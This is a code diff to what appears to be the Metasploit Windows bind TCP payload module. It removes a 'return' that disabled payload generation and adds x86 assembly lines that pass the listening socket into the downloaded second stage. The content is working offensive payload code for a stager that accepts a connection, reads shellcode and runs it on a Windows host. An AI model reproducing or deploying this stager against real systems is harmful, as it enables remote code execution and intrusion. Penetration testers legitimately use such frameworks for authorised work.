@@ -37,7 +37,6 @@ module Payload::Windows::BindTcp
       )
     end
 
-    return ""
     conf = {
       port:         datastore['LPORT'].to_i,
       exitfunk:     datastore['EXITFUNC'],
@@ -179,6 +178,7 @@ module Payload::Windows::BindTcp
         ^
       else
         asm << %Q^
+          push edi               ; store the listen socket to pass through to the second stage
           xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
         ^
       end
@@ -236,6 +236,13 @@ module Payload::Windows::BindTcp
         add ebx, eax           ; buffer += bytes_received
         sub esi, eax           ; length -= bytes_received, will set flags
         jnz read_more          ; continue if we have more to read
+        ^
+      if close_socket
+        asm << %Q^
+          pop esi                ; put the listen socket in esi
+          ^
+      end
+      asm << %Q^
         ret                    ; return into the second stage
         ^
 
